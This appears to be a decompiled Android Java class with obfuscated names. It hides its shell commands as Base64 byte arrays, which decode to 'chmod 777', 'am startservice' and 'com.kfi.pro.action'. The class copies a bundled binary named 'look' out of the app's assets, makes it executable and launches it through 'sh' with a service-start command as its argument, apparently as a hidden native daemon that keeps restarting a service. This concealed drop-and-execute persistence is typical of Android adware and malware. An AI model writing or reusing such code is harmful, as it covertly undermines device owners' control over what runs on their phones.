package com.m.u;

import android.content.Context;
import android.os.Environment;
import android.os.Process;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.InvocationTargetException;
import u.aly.bs;

public class n {
    public static final byte[] ACTION_TAG = new byte[]{(byte) 89, (byte) 50, (byte) 57, (byte) 116, (byte) 76, (byte) 109, (byte) 116, (byte) 116, (byte) 97, (byte) 83, (byte) 53, (byte) 119, (byte) 99, (byte) 109, (byte) 56, (byte) 117, (byte) 89, (byte) 87, (byte) 78, (byte) 48, (byte) 97, (byte) 87, (byte) 57, (byte) 117};
    public static final byte[] CMD1_TAG = new byte[]{(byte) 89, (byte) 87, (byte) 48, (byte) 103, (byte) 99, (byte) 51, (byte) 82, (byte) 104, (byte) 99, (byte) 110, (byte) 82, (byte) 122, (byte) 90, (byte) 88, (byte) 74, (byte) 50, (byte) 97, (byte) 87, (byte) 78, (byte) 108};
    public static final byte[] CMD2_TAG = new byte[]{(byte) 89, (byte) 50, (byte) 104, (byte) 116, (byte) 98, (byte) 50, (byte) 81, (byte) 103, (byte) 78, (byte) 122, (byte) 99, (byte) 51, (byte) 73, (byte) 65, (byte) 61, (byte) 61};
    public static final byte[] CMDUSER_TAG = new byte[]{(byte) 73, (byte) 67, (byte) 48, (byte) 116, (byte) 100, (byte) 88, (byte) 78, (byte) 108, (byte) 99, (byte) 105, (byte) 65, (byte) 61};
    public static final byte[] FILES_TAG = new byte[]{(byte) 76, (byte) 50, (byte) 90, (byte) 112, (byte) 98, (byte) 71, (byte) 86, (byte) 122, (byte) 76, (byte) 119, (byte) 61, (byte) 61};
    public static final byte[] LOOKLOCK_TAG = new byte[]{(byte) 76, (byte) 110, (byte) 82, (byte) 114, (byte) 76, (byte) 110, (byte) 82, (byte) 118, (byte) 89, (byte) 50, (byte) 119, (byte) 61};
    public static final byte[] LOOK_TAG = new byte[]{(byte) 98, (byte) 71, (byte) 57, (byte) 118, (byte) 97, (byte) 119, (byte) 61, (byte) 61};
    public static final byte[] MYUSERHANDLE_TAG = new byte[]{(byte) 98, (byte) 88, (byte) 108, (byte) 86, (byte) 99, (byte) 50, (byte) 86, (byte) 121, (byte) 83, (byte) 71, (byte) 70, (byte) 117, (byte) 90, (byte) 71, (byte) 120, (byte) 108};
    public static final byte[] SERIALNUMBER_TAG = new byte[]{(byte) 90, (byte) 50, (byte) 86, (byte) 48, (byte) 85, (byte) 50, (byte) 86, (byte) 121, (byte) 97, (byte) 87, (byte) 70, (byte) 115, (byte) 84, (byte) 110, (byte) 86, (byte) 116, (byte) 89, (byte) 109, (byte) 86, (byte) 121, (byte) 82, (byte) 109, (byte) 57, (byte) 121, (byte) 86, (byte) 88, (byte) 78, (byte) 108, (byte) 99, (byte) 103, (byte) 61, (byte) 61};
    public static final byte[] USER_TAG = new byte[]{(byte) 100, (byte) 88, (byte) 78, (byte) 108, (byte) 99, (byte) 103, (byte) 61, (byte) 61};
    private static n instance;
    private static Context mContext;

    class aa extends Thread {
        String aa;
        final /* synthetic */ n ab;

        aa(n nVar, String str) {
            this.ab = nVar;
            this.aa = str;
        }

        public void run() {
            this.ab.exec(this.aa);
        }
    }

    private void copyBigDataToSD(String str, InputStream inputStream) throws IOException {
        OutputStream fileOutputStream = new FileOutputStream(str);
        byte[] bArr = new byte[1024];
        int read = inputStream.read(bArr);
        while (read > 0) {
            fileOutputStream.write(bArr, 0, read);
            read = inputStream.read(bArr);
        }
        fileOutputStream.flush();
        inputStream.close();
        fileOutputStream.close();
    }

    private void exec(String str) {
        Object aa = ae.aa(CMD1_TAG);
        String userSerial = getUserSerial();
        if (userSerial != null) {
            aa = new StringBuilder(String.valueOf(aa)).append(ae.aa(CMDUSER_TAG)).append(userSerial).toString();
        }
        String stringBuilder = new StringBuilder(String.valueOf(aa)).append(" ").append("-a ").append(ae.aa(ACTION_TAG)).toString();
        stringBuilder = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(ae.aa(CMD2_TAG))).append(str).append(ae.aa(LOOK_TAG)).append(" \n").toString())).append(str).append(ae.aa(LOOK_TAG)).append(" \"").append(stringBuilder).append("\"").append(" \"").append(Environment.getExternalStorageDirectory().getAbsolutePath().concat("/").concat(ae.aa(LOOKLOCK_TAG))).append("\"").toString();
        try {
            DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("sh").getOutputStream());
            dataOutputStream.writeBytes(stringBuilder);
            dataOutputStream.flush();
            dataOutputStream.close();
        } catch (Exception e) {
        }
    }

    private boolean exist(String str) {
        return new File(str).exists();
    }

    public static n getInstance() {
        if (instance == null) {
            instance = new n();
        }
        return instance;
    }

    public String getUserSerial() {
        Object systemService = mContext.getSystemService(ae.aa(USER_TAG));
        if (systemService == null) {
            return null;
        }
        try {
            Object invoke = Process.class.getMethod(ae.aa(MYUSERHANDLE_TAG), null).invoke(Process.class, null);
            return String.valueOf(((Long) systemService.getClass().getMethod(ae.aa(SERIALNUMBER_TAG), new Class[]{invoke.getClass()}).invoke(systemService, new Object[]{invoke})).longValue());
        } catch (NoSuchMethodException e) {
            return null;
        } catch (IllegalArgumentException e2) {
            return null;
        } catch (IllegalAccessException e3) {
            return null;
        } catch (InvocationTargetException e4) {
            return null;
        } catch (Exception e5) {
            return null;
        }
    }

    public void launchBackgroundProcess() {
        String[] strArr = new String[]{ae.aa(LOOK_TAG)};
        String stringBuilder = new StringBuilder(String.valueOf(mContext.getFilesDir().getParent())).append(ae.aa(FILES_TAG)).toString();
        String str = bs.b;
        if (!exist(new StringBuilder(String.valueOf(stringBuilder)).append(strArr[0]).toString())) {
            try {
                copyBigDataToSD(new StringBuilder(String.valueOf(mContext.getFilesDir().getParent())).append(ae.aa(FILES_TAG)).append(strArr[0]).toString(), mContext.getResources().getAssets().open(strArr[0]));
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        new File(new StringBuilder(String.valueOf(stringBuilder)).append(ae.aa(LOOK_TAG)).toString()).setExecutable(true, true);
        new aa(this, stringBuilder).start();
    }

    public void startPro(Context context) {
        mContext = context;
        launchBackgroundProcess();
    }
}
